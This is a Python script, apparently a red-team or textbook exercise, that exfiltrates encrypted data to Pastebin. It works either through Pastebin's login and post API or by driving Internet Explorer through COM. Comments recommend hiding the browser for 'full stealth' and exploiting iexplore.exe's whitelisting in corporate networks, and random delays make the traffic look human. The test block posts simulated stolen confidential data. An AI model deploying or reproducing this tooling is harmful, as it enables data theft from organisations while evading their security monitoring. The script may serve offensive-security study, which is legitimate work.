import random
import requests
import time
import win32com.client

# =============================================
# CONFIGURATION
# =============================================
username    = ''
password    = ''
api_dev_key = ''


# =============================================
# HELPER FUNCTIONS
# =============================================
def wait_for_browser(browser):
    # Wait until browser finishes loading
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)


def random_sleep():
    # Sleep random time between 5-10 seconds
    # Makes automation look more human
    time.sleep(random.randint(5, 10))


# =============================================
# METHOD 1: plain_paste — Pastebin REST API
# Cross platform, uses requests library
# Two API calls: login → post
# =============================================
def plain_paste(title, contents):
    print('[*] Starting plain_paste via Pastebin API...')

    # FIX: decode and strip before sending
    # This ensures clean content goes to Pastebin
    if isinstance(contents, bytes):
        contents_str = contents.decode('utf-8').strip()
    else:
        contents_str = contents.strip()

    login_url  = 'https://pastebin.com/api/api_login.php'
    login_data = {
        'api_dev_key':       api_dev_key,
        'api_user_name':     username,
        'api_user_password': password,
    }

    r = requests.post(login_url, data=login_data)
    api_user_key = r.text

    paste_url  = 'https://pastebin.com/api/api_post.php'
    paste_data = {
        'api_paste_name':    title,
        'api_paste_code':    contents_str,  # ← clean string
        'api_dev_key':       api_dev_key,
        'api_user_key':      api_user_key,
        'api_option':        'paste',
        'api_paste_private': 1,
    }

    r = requests.post(paste_url, data=paste_data)
    print(f'[+] Paste URL: {r.text}')
    return r.text

# =============================================
# HELPER FUNCTIONS FOR IE METHOD
# =============================================
def login(ie):
    # Get all DOM elements
    full_doc = ie.Document.all

    # Find username and password fields and fill them
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)

    random_sleep()

    # Submit the login form
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()

    wait_for_browser(ie)


def submit(ie, title, contents):
    # Find paste form fields and fill them
    full_doc = ie.Document.all

    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)

    # Submit the paste form
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()

    random_sleep()
    wait_for_browser(ie)


# =============================================
# METHOD 2: ie_paste — Internet Explorer COM
# Windows only — uses iexplore.exe process
# iexplore.exe is trusted/whitelisted in
# most corporate environments
# =============================================
def ie_paste(title, contents):
    print('[*] Starting ie_paste via IE COM automation...')

    # Create IE COM object
    ie = win32com.client.Dispatch('InternetExplorer.Application')

    # Set to 1 to see browser (debugging)
    # Set to 0 for full stealth in real engagement
    ie.Visible = 1

    # Navigate to login page
    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    print('[*] Navigated to login page')

    # Login using DOM automation
    login(ie)
    print('[+] Logged in successfully')

    # Navigate to paste creation page
    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)

    # Submit the paste
    submit(ie, title, contents.decode())
    print('[+] Paste submitted!')

    # Kill IE instance
    ie.Quit()
    print('[+] IE closed')


# =============================================
# TESTING
# =============================================
if __name__ == '__main__':
    from cryptor import encrypt

    # Simulate stolen document contents
    secret_data = b'CONFIDENTIAL: Network diagram, passwords, internal docs'

    print(f'[*] Original data : {secret_data}')

    # Encrypt before exfiltrating
    encrypted = encrypt(secret_data)
    print(f'[*] Encrypted     : {encrypted[:40]}...')

    # Test Method 1: API paste
    print('\n' + '='*50)
    print('TESTING METHOD 1: plain_paste (API)')
    print('='*50)
    paste_url = plain_paste('stolen_document.pdf', encrypted)
    print(f'[+] Data exfiltrated to: {paste_url}')